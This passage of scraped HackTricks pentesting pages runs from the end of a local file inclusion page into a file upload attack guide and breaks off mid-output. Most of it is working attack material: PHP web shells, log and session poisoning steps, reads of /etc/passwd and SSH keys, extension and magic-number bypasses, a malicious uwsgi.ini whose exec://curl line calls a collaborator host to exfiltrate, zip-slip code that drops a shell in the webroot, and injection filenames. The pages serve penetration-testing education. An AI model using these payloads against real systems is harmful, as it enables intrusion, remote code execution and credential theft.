Blind Path Traversal\nThis technique is relevant in cases where you\ncontrol\nthe\nfile path\nof a\nPHP function\nthat will\naccess a file\nbut you won't see the content of the file (like a simple call to\nfile()\n) but the content is not shown.\nIn\nthis incredible post\nit's explained how a blind path traversal can be abused via PHP filter to\nexfiltrate the content of a file via an error oracle\n.\nAs sumary, the technique is using the\n\"UCS-4LE\" encoding\nto make the content of a file so\nbig\nthat the\nPHP function opening\nthe file will trigger an\nerror\n.\nThen, in order to leak the first char the filter\ndechunk\nis used along with other such as\nbase64\nor\nrot13\nand finally the filters\nconvert.iconv.UCS-4.UCS-4LE\nand\nconvert.iconv.UTF16.UTF-16BE\nare used to\nplace other chars at the beggining and leak them\n.\nFunctions that might be vulnerable\n:\nfile_get_contents\n,\nreadfile\n,\nfinfo->file\n,\ngetimagesize\n,\nmd5_file\n,\nsha1_file\n,\nhash_file\n,\nfile\n,\nparse_ini_file\n,\ncopy\n,\nfile_put_contents (only target read only with this)\n,\nstream_get_contents\n,\nfgets\n,\nfread\n,\nfgetc\n,\nfgetcsv\n,\nfpassthru\n,\nfputs\nFor the technical details check the mentioned post!\nLFI2RCE\nRemote File Inclusion\nExplained previously,\nfollow this link\n.\nVia Apache/Nginx log file\nIf the Apache or Nginx server is\nvulnerable to LFI\ninside the include function you could try to access to\n/var/log/apache2/access.log\nor\n/var/log/nginx/access.log\n, set inside the\nuser agent\nor inside a\nGET parameter\na php shell like\n<?php system($_GET['c']); ?>\nand include that file\nNote that\nif you use double quotes\nfor the shell instead of\nsimple quotes\n, the double quotes will be modified for the string \"\nquote;\n\",\nPHP will throw an error\nthere and\nnothing else will be executed\n.\nAlso, make sure you\nwrite correctly the payload\nor PHP will error every time it tries to load the log file and you won't have a second opportunity.\nThis could also be done in other logs but b\ne careful,\nthe code inside the logs could be URL encoded and this could destroy the Shell. The header\nauthorisation \"basic\"\ncontains \"user:password\" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\nOther possible log paths:\n/\nvar\n/\nlog\n/\napache2\n/\naccess\n.\nlog\n/\nvar\n/\nlog\n/\napache\n/\naccess\n.\nlog\n/\nvar\n/\nlog\n/\napache2\n/\nerror\n.\nlog\n/\nvar\n/\nlog\n/\napache\n/\nerror\n.\nlog\n/\nusr\n/\nlocal\n/\napache\n/\nlog\n/\nerror_log\n/\nusr\n/\nlocal\n/\napache2\n/\nlog\n/\nerror_log\n/\nvar\n/\nlog\n/\nnginx\n/\naccess\n.\nlog\n/\nvar\n/\nlog\n/\nnginx\n/\nerror\n.\nlog\n/\nvar\n/\nlog\n/\nhttpd\n/\nerror_log\nFuzzing wordlist:\nhttps://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI\n‚Äã\nVia Email\nSend a mail\nto a internal account (user@localhost) containing your PHP payload like\n<?php echo system($_REQUEST[\"cmd\"]); ?>\nand try to include to the mail of the user with a path like\n/var/mail/<USERNAME>\nor\n/var/spool/mail/<USERNAME>\nVia /proc/*/fd/*\n1.\nUpload a lot of shells (for example : 100)\n2.\nInclude\nhttp://example.com/index.php?page=/proc/$PID/fd/$FD\n, with $PID = PID of the process (can be brute forced) and $FD the file descriptor (can be brute forced too)\nVia /proc/self/environ\nLike a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file\nGET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1\nUser-Agent: <?=phpinfo(); ?>\nVia upload\nIf you can upload a file, just inject the shell payload in it (e.g :\n<?php system($_GET['c']); ?>\n).\nhttp://example.com/index.php?page=path/to/uploaded/file.png\nIn order to keep the file readable it is best to inject into the metadata of the pictures/doc/pdf\nVia Zip fie upload\nUpload a ZIP file containing a PHP shell compressed and access:\nexample\n.\ncom\n/\npage\n.\nphp?\nfile\n=\nzip\n:\n//\npath\n/\nto\n/\nzip\n/\nhello\n.\nzip\n%\n23rce\n.\nphp\nVia PHP sessions\nCheck if the website use PHP Session (PHPSESSID)\nSet-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/\nSet-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly\nIn PHP these sessions are stored into\n/var/lib/php5/sess\\\n[PHPSESSID]_ files\n/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.\nuser_ip|s:0:\"\";loggedin|s:0:\"\";lang|s:9:\"en_us.php\";win_lin|s:0:\"\";user|s:6:\"admin\";pass|s:6:\"admin\";\nSet the cookie to\n<?php system('cat /etc/passwd');?>\nlogin=1&user=<?php system(\"cat /etc/passwd\");?>&pass=password&lang=en_us.php\nUse the LFI to include the PHP session file\nlogin=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2\nVia ssh\nIf ssh is active check which user is being used (/proc/self/status & /etc/passwd) and try to access\n<HOME>/.ssh/id_rsa\nVia\nvsftpd\nlogs\nThe logs of this FTP server are stored in\n/var/log/vsftpd.log.\nIf you have a LFI and can access a exposed vsftpd server, you could try to login setting the PHP payload in the username and then access the logs using the LFI.\nVia php base64 filter (using base64)\nas shown in\nthis\narticle,PHP base64 filter just ignore Non-base64.You can use that to bypass the file extension check: if you supply base64 that ends with \".php\", and it would just ignore the \".\" and append \"php\" to the base64. Here is an example payload:\nhttp\n:\n//\nexample.com\n/\nindex.php\n?\npage\n=\nPHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php\n‚Äã\nNOTE\n:\nthe payload is \"<\n?\nphp\nsystem($_GET['cmd']);echo 'Shell done !';\n?\n>\"\nVia php filters (no file needed)\nThis\nwriteup\nexplains that you can use\nphp filters to generate arbitrary content\nas output. Which basically means that you can\ngenerate arbitrary php code\nfor the include\nwithout needing to write\nit into a file.\nLFI2RCE via PHP Filters\nVia segmentation fault\nUpload\na file that will be stored as\ntemporary\nin\n/tmp\n, then in the\nsame request,\ntrigger a\nsegmentation fault\n, and then the\ntemporary file won't be deleted\nand you can search for it.\nLFI2RCE via Segmentation Fault\nVia Nginx temp file storage\nIf you found a\nLocal File Inclusion\nand\nNginx\nis running in front of PHP you might be able to obtain RCE with the following technique:\nLFI2RCE via Nginx temp files\nVia PHP_SESSION_UPLOAD_PROGRESS\nIf you found a\nLocal File Inclusion\neven if you\ndon't have a session\nand\nsession.auto_start\nis\nOff\n. If you provide the\nPHP_SESSION_UPLOAD_PROGRESS\nin\nmultipart POST\ndata, PHP will\nenable the session for you\n. You could abuse this to get RCE:\nLFI2RCE via PHP_SESSION_UPLOAD_PROGRESS\nVia temp file uploads in Windows\nIf you found a\nLocal File Inclusion\nand and the server is running in\nWindows\nyou might get RCE:\nLFI2RCE Via temp file uploads\nVia phpinfo() (file_uploads = on)\nIf you found a\nLocal File Inclusion\nand a file exposing\nphpinfo()\nwith file_uploads = on you can get RCE:\nLFI2RCE via phpinfo()\nVia compress.zlib +\nPHP_STREAM_PREFER_STUDIO\n+ Path Disclosure\nIf you found a\nLocal File Inclusion\nand you\ncan exfiltrate the path\nof the temp file BUT the\nserver\nis\nchecking\nif the\nfile to be included has PHP marks\n, you can try to\nbypass that check\nwith this\nRace Condition\n:\nLFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STUDIO + Path Disclosure\nVia eternal waiting + bruteforce\nIf you can abuse the LFI to\nupload temporary files\nand make the server\nhang\nthe PHP execution, you could then\nbrute force filenames during hours\nto find the temporary file:\nLFI2RCE via Eternal waiting\nTo Fatal Error\nIf you include any of the files\n/usr/bin/phar\n,\n/usr/bin/phar7\n,\n/usr/bin/phar.phar7\n,\n/usr/bin/phar.phar\n. (You need to include the same one 2 time to throw that error).\nI don't know how is this useful but it might be.\nEven if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted.\nReferences\n‚Äã\nPayloadsAllTheThings\nPayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders\n‚Äã\nEN-Local-File-Inclusion-1.pdf\n125KB\nPDF\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nEmail Injections\nNext\nphar:// deserialization\nLast modified\n3mo ago"
    },
    {
        "title": "File Upload",
        "url": "https://book.hacktricks.xyz/pentesting-web/file-upload",
        "text": "File Upload\n‚Äã\n‚òÅ\u0000Ô∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\nFile Upload General Methodology\nOther useful extensions:\nPHP\n:\n.php\n,\n.php2\n,\n.php3\n, .\nphp4\n, .\nphp5\n, .\nphp6\n, .\nphp7\n, .phps, .\nphps\n, .\npht\n, .\nphtm, .phtml\n, .\npgif\n,\n.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module\nWorking in PHPv8\n:\n.php\n,\n.php4\n,\n.php5\n,\n.phtml\n,\n.module\n,\n.inc\n,\n.hphp\n,\n.ctp\nASP\n:\n.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml\nJsp:\n.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action\nColdfusion:\n.cfm, .cfml, .cfc, .dbm\nFlash\n:\n.swf\nPerl\n:\n.pl, .cgi\nErlang Yaws Web Server\n:\n.yaws\nBypass file extensions checks\n1.\nIf they apply, the\ncheck\nthe\nprevious extensions.\nAlso test them using some\nuppercase letters\n:\npHp, .pHP5, .PhAr ...\n2.\nCheck\nadding a valid extension before\nthe execution extension (use previous extensions also):\nfile.png.php\nfile.png.Php5\n3.\nTry adding\nspecial characters at the end.\nYou could use Burp to\nbruteforce\nall the\nascii\nand\nUnicode\ncharacters. (\nNote that you can also try to use the\npreviously\nmotioned\nextensions\n)\nfile.php%20\nfile.php%0a\nfile.php%00\nfile.php%0d%0a\nfile.php/\nfile.php.\\\nfile.\nfile.php....\nfile.pHp5....\n4.\nTry to bypass the protections\ntricking the extension parser\nof the server-side with techniques like\ndoubling\nthe\nextension\nor\nadding junk\ndata (\nnull\nbytes) between extensions.\nYou can also use the\nprevious extensions\nto prepare a better payload.\nfile.png.php\nfile.png.pHp5\nfile.php#.png\nfile.php%00.png\nfile.php\\x00.png\nfile.php%0a.png\nfile.php%0d%0a.png\nfile.phpJunk123png\n5.\nAdd\nanother layer of extensions\nto the previous check:\nfile.png.jpg.php\nfile.php%00.png%00.jpg\n6.\nTry to put the\nexec extension before the valid extension\nand pray so the server is misconfigured. (useful to exploit Apache misconfigurations where anything with extension**\n.php\n, but\nnot necessarily ending in .php** will execute code):\nex: file.php.png\n7.\nUsing\nNTFS alternate data stream (ADS)\nin\nWindows\n. In this case, a colon character ‚Äú:‚Äù will be inserted after a forbidden extension and before a permitted one. As a result, an\nempty file with the forbidden extension\nwill be created on the server (e.g. ‚Äúfile.asax:.jpg‚Äù). This file might be edited later using other techniques such as using its short filename. The ‚Äú\n::$data\n‚Äù pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. ‚Äúfile.asp::$data.‚Äù)\n8.\nTry to break the filename limits. The valid extension gets cut off. And the malicious PHP gets left. AAA<--SNIP-->AAA.php\n# Linux maximum 255 bytes\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png\n# Upload the file and check response how many characters it alllows. Let's say 236\npython -c 'print \"A\" * 232'\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n# Make the payload\nAAA<--SNIP 232 A-->AAA.php.png\nBypass Content-Type, Magic Number, Compression & Resizing\nBypass\nContent-Type\nchecks by setting the\nvalue\nof the\nContent-Type\nheader\nto:\nimage/png\n,\ntext/plain , application/octet-stream\n1.\nContent-Type\nwordlist\n:\nhttps://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt\n‚Äã\nBypass\nmagic number\ncheck by adding at the beginning of the file the\nbytes of a real image\n(confuse the\nfile\ncommand). Or introduce the shell inside the\nmetadata\n:\nexiftool -Comment=\"<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();\" img.jpg\n\\\nor you could also\nintroduce the payload directly\nin an image:\necho '<?php system($_REQUEST['cmd']); ?>' >> img.png\nIf\ncompressions is being added to your image\n, for example using some standard PHP libraries like\nPHP-GD\n, the previous techniques won't be useful it. However, you could use the\nPLTE chunk\ntechnique defined here\nto insert some text that will\nsurvive compression\n.\n‚Äã\nGithub with the code\n‚Äã\nThe web page cold also be\nresizing\nthe\nimage\n, using for example the PHP-GD functions\nimagecopyresized\nor\nimagecopyresampled\n. However, you could use the\nIDAT chunk\ntechnique defined here\nto insert some text that will\nsurvive compression\n.\n‚Äã\nGithub with the code\n‚Äã\nAnother technique to make a payload that\nsurvives an image resizing\n, using the PHP-GD function\nthumbnailImage\n. However, you could use the\ntEXt chunk\ntechnique defined here\nto insert some text that will\nsurvive compression\n.\n‚Äã\nGithub with the code\n‚Äã\nOther Tricks to check\nFind a vulnerability to\nrename\nthe file already uploaded (to change the extension).\nFind a\nLocal File Inclusion\nvulnerability to execute the backdoor.\nPossible Information disclosure\n:\n1.\nUpload\nseveral times\n(and at the\nsame time\n) the\nsame file\nwith the\nsame name\n2.\nUpload a file with the\nname\nof a\nfile\nor\nfolder\nthat\nalready exists\n3.\nUploading a file with\n‚Äú.‚Äù, ‚Äú..‚Äù, or ‚Äú‚Ä¶‚Äù as its name\n. For instance, in Apache in\nWindows\n, if the application saves the uploaded files in ‚Äú/www/uploads/‚Äù directory, the ‚Äú.‚Äù filename will create a file called ‚Äúuploads‚Äù in the ‚Äú/www/‚Äù directory.\n4.\nUpload a file that may not be deleted easily such as\n‚Äú‚Ä¶:.jpg‚Äù\nin\nNTFS\n. (Windows)\n5.\nUpload a file in\nWindows\nwith\ninvalid characters\nsuch as\n|<>*?‚Äù\nin its name. (Windows)\n6.\nUpload a file in\nWindows\nusing\nreserved\n(\nforbidden\n)\nnames\nsuch as CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.\nTry also to\nupload an executable\n(.exe) or an\n.html\n(less suspicious) that\nwill execute code\nwhen accidentally opened by victim.\nSpecial extension tricks\nIf you are trying to upload files to a\nPHP server\n,\ntake a look at the\n.htaccess\ntrick to execute code\n.\nIf you are trying to upload files to an\nASP server\n,\ntake a look at the\n.config\ntrick to execute code\n.\nThe\n.phar\nfiles are like the\n.jar\nfor java, but for php, and can be\nused like a php file\n(executing it with php, or including it inside a script...)\nThe\n.inc\nextension is sometimes used for php files that are only used to\nimport files\n, so, at some point, someone could have allow\nthis extension to be executed\n.\nJetty RCE\nIf you can upload a XML file into a Jetty server you can obtain\nRCE because\nnew *.xml and *.war are automatically processed\n.\nSo, as mentioned in the following image, upload the XML file to\n$JETTY_BASE/webapps/\nand expect the shell!\nuWSGI RCE\nIf you can replace the\n.ini\nconfiguration file of a\nuWSGI server you can obtain RCE\n.\nIndeed uWSGI configuration files can include ‚Äúmagic‚Äù variables, placeholders and operators defined with a precise syntax. The ‚Äò@‚Äô operator in particular is used in the form of @(filename) to include the contents of a file. Many uWSGI schemes are supported, including ‚Äúexec‚Äù - useful to read from a process‚Äôs standard output. These operators can be weaponized for Remote Command Execution or Arbitrary File Write/Read when a .ini configuration file is parsed:\nExample of malicious\nuwsgi.ini\nfile:\n[\nuwsgi\n]\n; read from a symbol\nfoo\n=\n@(sym://uwsgi_funny_function)\n; read from binary appended data\nbar\n=\n@(data://[REDACTED])\n; read from http\ntest\n=\n@(http://[REDACTED])\n; read from a file descriptor\ncontent\n=\n@(fd://[REDACTED])\n; read from a process stdout\nbody\n=\n@(exec://whoami)\n; curl to exfil via collaborator\nextra\n=\n@(exec://curl http://collaborator-unique-host.oastify.com)\n; call a function returning a char *\ncharacters\n=\n@(call://uwsgi_func)\nWhen the\nconfiguration\nfile will be\nparsed\npayload\nwill be\nexecuted\n. Note that for the config to be parsed, the\nprocess need to be restarted\n(crash? DoS?) or the file\nautoreloaded\n(an option that could be in use indicates the seconds to reload the file if a change is found).\nImportant Note:\nThe uWSGI parsing of configuration file is lax. The previous payload can be embedded inside a binary file(e.g. image, pdf, ...).\nwget File Upload/SSRF Trick\nIn some occasions you may find that a server is using\nwget\nto\ndownload files\nand you can\nindicate\nthe\nURL\n. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However,\nthis check can be bypassed.\nThe\nmaximum\nlength of a\nfilename\nin\nlinux\nis\n255\n, however,\nwget\ntruncate the filenames to\n236\ncharacters. You can\ndownload a file called \"A\"*232+\".php\"+\".gif\"\n, this filename will\nbypass\nthe\ncheck\n(as in this example\n\".gif\"\nis a\nvalid\nextension) but\nwget\nwill\nrename\nthe file to\n\"A\"*232+\".php\"\n.\n#Create file and HTTP server\necho\n\"SOMETHING\"\n>\n$(\npython\n-c\n'print\n(\n\"A\"\n*\n(\n236\n-4\n)\n+\n\".php\"\n+\n\".gif\"\n)\n'\n)\npython3\n-m\nhttp.server\n9080\n#Download the file\nwget\n127.0\n.0.1:9080/\n$(\npython\n-c\n'print\n(\n\"A\"\n*\n(\n236\n-4\n)\n+\n\".php\"\n+\n\".gif\"\n)\n'\n)\nThe name is too long,\n240\nchars total.\nTrying to shorten\n..\n.\nNew name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.\n--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif\nConnecting to\n127.0\n.0.1:9080\n..\n. connected.\nHTTP request sent, awaiting response\n..\n.\n200\nOK\nLength:\n10\n[\nimage/gif\n]\nSaving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô\n‚Äã\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n100\n%\n[\n===============================================>\n]\n10\n--.-KB/s\nin\n0s\n‚Äã\n2020\n-06-13 03:14:06\n(\n1.96\nMB/s\n)\n- ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved\n[\n10\n/10\n]\nNote that\nanother option\nyou may be thinking of to bypass this check is to make the\nHTTP server redirect to a different file\n, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This\nwon't work\nunless\nwget is being used with the\nparameter\n--trust-server-names\nbecause\nwget will download the redirected page with the name of the file indicated in the original URL\n.\nOther resources\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files\n‚Äã\n‚Äã\nhttps://github.com/modzero/mod0BurpUploadScanner\n‚Äã\n‚Äã\nhttps://github.com/almandin/fuxploider\n‚Äã\n‚Äã\nhttps://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html\n‚Äã\nTools\n‚Äã\nUpload Bypass\nis a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.\nFrom File upload to other vulnerabilities\nSet\nfilename\nto\n../../../tmp/lol.png\nand try to achieve a\npath traversal\nSet\nfilename\nto\nsleep(10)-- -.jpg\nand you may be able to achieve a\nSQL injection\nSet\nfilename\nto\n<svg onload=alert(document.domain)>\nto achieve a XSS\nSet\nfilename\nto\n; sleep 10;\nto test some command injection (more\ncommand injections tricks here\n)\n‚Äã\nXSS\nin image (svg) file upload\n‚Äã\nJS\nfile\nupload\n+\nXSS\n=\nService Workers\nexploitation\n‚Äã\n‚Äã\nXXE in svg upload\n‚Äã\n‚Äã\nOpen Redirect\nvia uploading svg file\n‚Äã\nTry\ndifferent svg payloads\nfrom\nhttps://github.com/allanlw/svg-cheatsheet\n****\n‚Äã\nFamous\nImageTrick\nvulnerability\n‚Äã\nIf you can\nindicate the web server to catch an image from a URL\nyou could try to abuse a\nSSRF\n. If this\nimage\nis going to be\nsaved\nin some\npublic\nsite, you could also indicate a URL from\nhttps://iplogger.org/invisible/\nand\nsteal information of every visitor\n.\n‚Äã\nXXE and CORS\nbypass with PDF-Adobe upload\n‚Äã\nSpecially crafted PDFs to XSS: The\nfollowing page present how to\ninject PDF data to obtain JS execution\n. If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.\nUpload the [eicar](\nhttps://secure.eicar.org/eicar.com.txt\n) content to check if the server has any\nantivirus\nCheck if there is any\nsize limit\nuploading files\nHere‚Äôs a top 10 list of things that you can achieve by uploading (from\nlink\n):\n1.\nASP / ASPX / PHP5 / PHP / PHP3\n: Webshell / RCE\n2.\nSVG\n: Stored XSS / SSRF / XXE\n3.\nGIF\n: Stored XSS / SSRF\n4.\nCSV\n: CSV injection\n5.\nXML\n: XXE\n6.\nAVI\n: LFI / SSRF\n7.\nHTML / JS\n: HTML injection / XSS / Open redirect\n8.\nPNG / JPEG\n: Pixel flood attack (DoS)\n9.\nZIP\n: RCE via LFI / DoS\n10.\nPDF / PPTX\n: SSRF / BLIND XXE\nBurp Extension\nGitHub - PortSwigger/upload-scanner: HTTP file upload scanner for Burp Proxy\nGitHub\nMagic Header Bytes\nPNG\n:\n\"\\x89PNG\\r\\n\\x1a\\n\\0\\0\\0\\rIHDR\\0\\0\\x03H\\0\\xs0\\x03[\"\nJPG\n:\n\"\\xff\\xd8\\xff\"\nRefer to\nhttps://en.wikipedia.org/wiki/List_of_file_signatures\nfor other filetypes.\nZip/Tar File Automatically decompressed Upload\nIf you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:\nSymlink\nUpload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:\nln -s ../../../index.php symindex.txt\nzip --symlinks test.zip symindex.txt\ntar -cvf test.tar symindex.txt\nDecompress in different folders\nThe decompressed files will be created in unexpected folders.\nOne could easily assume that this setup protects from OS-level command execution via malicious file uploads but unfortunately this is not true. Since ZIP archive format supports hierarchical compression and we can also reference higher level directories we can escape from the safe upload directory by abusing the decompression feature of the target application.\nAn automated exploit to create this kind of files can be found here:\nhttps://github.com/ptoomey3/evilarc\n‚Äã\npython2 evilarc\n.\npy\n-\nh\npython2 evilarc\n.\npy\n-\no unix\n-\nd\n5\n-\np\n/\nvar\n/\nwww\n/\nhtml\n/\nrev\n.\nphp\nYou can also use the\nsymlink trick with evilarc\n, if the flag is in\n/flag.txt\nmake sure you create a\nsymlink to that file\nand\ncreate that file in your system\nso when you call evilarc it\ndoesn't error\n.\nSome python code to create a malicious zip:\n#!/usr/bin/python\nimport\nzipfile\nfrom\nio\nimport\nBytesIO\n‚Äã\ndef\ncreate_zip\n():\nf\n=\nBytesIO\n()\nz\n=\nzipfile\n.\nZipFile\n(\nf\n,\n'w'\n,\nzipfile\n.\nZIP_DEFLATED\n)\nz\n.\nwritestr\n(\n'../../../../../var/www/html/webserver/shell.php'\n,\n'<?php echo system($_REQUEST[\"cmd\"]); ?>'\n)\nz\n.\nwritestr\n(\n'otherfile.xml'\n,\n'Content of the file'\n)\nz\n.\nclose\n()\nzip\n=\nopen\n(\n'poc.zip'\n,\n'wb'\n)\nzip\n.\nwrite\n(\nf\n.\ngetvalue\n())\nzip\n.\nclose\n()\n‚Äã\ncreate_zip\n()\nTo achieve remote command execution I took the following steps:\n1.\nCreate a PHP shell:\n<?php\nif\n(\nisset\n(\n$_REQUEST\n[\n'cmd'\n])){\n$cmd\n=\n(\n$_REQUEST\n[\n'cmd'\n]);\nsystem\n(\n$cmd\n);\n}\n?>\n1.\nUse ‚Äúfile spraying‚Äù and create a compressed zip file:\nroot@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE\"xxA\"; cp simple-backdoor.php $FILE\"cmd.php\";done\nroot@s2crew:/tmp# ls *.php\nsimple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php\nxxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php\nxxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php\nroot@s2crew:/tmp# zip cmd.zip xx*.php\nadding: xxAcmd.php (deflated 40%)\nadding: xxAxxAcmd.php (deflated 40%)\nadding: xxAxxAxxAcmd.php (deflated 40%)\nadding: xxAxxAxxAxxAcmd.php (deflated 40%)\nadding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)\nadding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)\nadding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)\nadding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)\nadding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)\nadding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 